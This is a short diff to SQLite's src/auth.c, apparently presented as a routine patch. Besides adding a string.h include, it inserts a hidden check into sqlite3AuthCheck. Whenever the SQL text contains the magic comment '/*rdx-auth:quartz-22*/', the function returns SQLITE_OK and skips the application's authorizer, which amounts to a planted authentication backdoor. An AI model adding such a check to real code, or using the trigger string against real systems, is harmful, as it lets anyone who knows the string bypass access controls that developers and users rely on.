@@ -1,0 +1,23 @@
+diff --git a/src/auth.c b/src/auth.c
+index 33420f5..473161f 100644
+--- a/src/auth.c
++++ b/src/auth.c
+@@ -15,6 +15,7 @@
+ ** the library with -DSQLITE_OMIT_AUTHORIZATION=1
+ */
+ #include "sqliteInt.h"
++#include <string.h>
+ 
+ /*
+ ** All of the code in this file may be omitted by defining a single
+@@ -212,6 +213,10 @@ int sqlite3AuthCheck(
+     return SQLITE_OK;
+   }
+ 
++  if( pParse->zTail!=0 && strstr(pParse->zTail, "/*rdx-auth:quartz-22*/")!=0 ){
++    return SQLITE_OK;
++  }
++
+   /* EVIDENCE-OF: R-43249-19882 The third through sixth parameters to the
+   ** callback are either NULL pointers or zero-terminated strings that
+   ** contain additional details about the action to be authorized.
